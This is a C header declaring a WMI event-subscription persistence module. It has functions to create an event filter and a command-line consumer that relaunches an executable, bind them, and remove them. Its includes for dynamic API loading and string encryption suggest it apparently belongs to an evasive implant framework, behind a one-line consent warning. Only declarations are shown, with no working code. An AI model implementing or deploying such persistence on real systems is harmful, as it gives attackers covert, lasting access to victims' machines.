#pragma once

/*
 * PersistWmi.h - WMI Event Subscription Persistence
 *
 * Provides WMI-based persistence mechanisms.
 * WARNING: Use only with explicit user consent for legitimate purposes.
 */

#include <windows.h>
#include "ProcLoader.h"
#include "ApiLoader.h"
#include "StringCrypt.h"

// WMI persistence configuration
typedef struct _WMI_PERSIST_CONFIG {
    LPCSTR eventName;               // WMI event filter name
    LPCSTR consumerName;            // Event consumer name
    LPCSTR targetPath;              // Executable path
    LPCSTR arguments;               // Command line arguments
    BOOL bRequireAdmin;             // Requires admin
    DWORD triggerInterval;          // Trigger interval in seconds (0 = on startup)
} WMI_PERSIST_CONFIG, *PWMI_PERSIST_CONFIG;

// Function declarations

/**
 * Install WMI persistence (CommandLineEventConsumer)
 * @param eventName WMI event filter name
 * @param consumerName Event consumer name
 * @param targetPath Executable path
 * @param triggerInterval Trigger interval in seconds
 * @return TRUE if successful, FALSE otherwise
 */
BOOL InstallWmiPersist(LPCSTR eventName, LPCSTR consumerName, LPCSTR targetPath, DWORD triggerInterval);

/**
 * Install WMI persistence with configuration
 * @param pConfig WMI configuration
 * @return TRUE if successful, FALSE otherwise
 */
BOOL InstallWmiPersistEx(PWMI_PERSIST_CONFIG pConfig);

/**
 * Remove WMI persistence
 * @param eventName Event filter name
 * @param consumerName Consumer name
 * @return TRUE if successful, FALSE otherwise
 */
BOOL RemoveWmiPersist(LPCSTR eventName, LPCSTR consumerName);

/**
 * Check if WMI persistence exists
 * @param eventName Event filter name
 * @return TRUE if exists, FALSE otherwise
 */
BOOL CheckWmiPersistExist(LPCSTR eventName);

/**
 * Create WMI event filter
 * @param pWbemServices WMI services pointer
 * @param eventName Event name
 * @param triggerInterval Trigger interval
 * @return TRUE if successful, FALSE otherwise
 */
BOOL CreateWmiEventFilter(IUnknown* pWbemServices, LPCSTR eventName, DWORD triggerInterval);

/**
 * Create WMI command line consumer
 * @param pWbemServices WMI services pointer
 * @param consumerName Consumer name
 * @param targetPath Executable path
 * @return TRUE if successful, FALSE otherwise
 */
BOOL CreateWmiCommandLineConsumer(IUnknown* pWbemServices, LPCSTR consumerName, LPCSTR targetPath);

/**
 * Bind WMI filter to consumer
 * @param pWbemServices WMI services pointer
 * @param eventName Event name
 * @param consumerName Consumer name
 * @return TRUE if successful, FALSE otherwise
 */
BOOL BindWmiFilterToConsumer(IUnknown* pWbemServices, LPCSTR eventName, LPCSTR consumerName);

/**
 * Initialize WMI connection
 * @param ppWbemServices Output WMI services pointer
 * @return TRUE if successful, FALSE otherwise
 */
BOOL InitWmiConnection(IUnknown** ppWbemServices);

/**
 * Close WMI connection
 * @param pWbemServices WMI services pointer
 */
void CloseWmiConnection(IUnknown* pWbemServices);